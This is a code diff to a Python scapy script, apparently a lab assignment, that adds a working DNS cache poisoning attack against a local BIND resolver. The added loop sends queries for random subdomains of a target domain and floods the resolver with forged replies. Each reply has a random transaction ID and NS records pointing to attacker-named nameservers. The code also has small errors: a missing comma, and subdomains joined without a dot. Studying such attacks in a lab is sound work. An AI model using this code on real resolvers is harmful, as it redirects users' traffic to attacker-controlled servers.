@@ -21,6 +21,8 @@ my_port = args.dns_port
 # port that your bind uses to send its DNS queries
 my_query_port = args.query_port
 
+target_domain = 'example.com'
+
 '''
 Generates random strings of length 10.
 '''
@@ -47,13 +49,28 @@ Example code that sends a DNS query using scapy.
 '''
 def exampleSendDNSQuery():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-    dnsPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))
-    sendPacket(sock, dnsPacket, my_ip, my_port)
-    response = sock.recv(4096)
-    response = DNS(response)
-    print "\n***** Packet Received from Remote Server *****"
-    print response.show()
-    print "***** End of Remote Server Packet *****\n"
+    
+    dns_packet = DNS(rd=1, qd=DNSQR(qname=target_domain))
+    
+    spoof_res = DNS(id=getRandomTXID(), qr=1, aa=1, nscount = 2
+                        qd=DNSQR(qname=target_domain), 
+                        an=DNSRR(rrname=target_domain, ttl=70000, rdata='1.2.3.4', rdlen=4, type=1),
+                        ns=[
+                            DNSRR(rrname=target_domain, type = 'NS', rclass = 'IN', ttl = 82046,  rdata= 'ns1.dnsattacket.net'), 
+                            DNSRR(rrname=target_domain, type = 'NS', rclass = 'IN', ttl = 82046,  rdata= 'ns2.dnsattacket.net')
+                           ],
+                        ar=None
+                        )
+    while True:
+        # Query the BIND server for a random DNS request
+        random_domain = getRandomSubDomain() + target_domain
+        dns_packet.qd.qname = random_domain
+        sendPacket(sock, dns_packet, my_ip, my_port)
+        
+        # Flood the cache with a stream of spoofed DNS replies
+        for i in range(30):
+            spoof_res.id = getRandomTXID()
+            sendPacket(sock, spoof_res, my_ip, my_query_port)
 
 
 if __name__ == '__main__':
